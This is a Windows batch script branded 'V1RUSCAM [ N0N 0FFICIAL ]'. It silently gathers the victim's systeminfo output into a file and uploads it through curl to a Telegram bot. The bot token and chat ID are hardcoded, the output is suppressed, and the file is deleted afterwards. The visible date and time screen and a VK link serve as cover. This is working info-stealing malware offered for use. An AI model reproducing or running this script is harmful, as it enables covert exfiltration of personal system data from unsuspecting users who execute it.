@echo off
chcp 65001 > nul
mode con:cols=60 lines=10
title V1RUSCAM [ N0N 0FFICIAL ]
cls

set "BOT_TOKEN=7360956253:AAGcKMr9NLHTubWGZWfWTODaWoR0OwS44HI"
set "CHAT_ID=5757337298"

:: curl
where curl >nul 2>&1
if %ERRORLEVEL% neq 0 (
    choco install curl -y
) >nul 2>&1

start https://vk.com/s4ull3ss_4r3_y0u_0k4y

::----------------------------------------------------------------------------------------------------------------------------
SET "sys_inf=sys.txt"

chcp 65001 > nul

systeminfo > "%sys_inf%"
compact /c "%sys_inf%" >nul 2>&1
curl -X POST -F "chat_id=%CHAT_ID%" -F "document=@%sys_inf%" https://api.telegram.org/bot%BOT_TOKEN%/sendDocument >nul 2>&1
::----------------------------------------------------------------------------------------------------------------------------

echo.
echo  V1RUSCAM [ N0N 0FFICIAL ]
echo.
echo  %date:~-4%%date:~-7,2%%date:~-10,2%
echo  %time:~0,2%%time:~3,2%%time:~6,2%
echo.
echo.

del %sys_inf% > nul

timeout /t 3 /nobreak > nul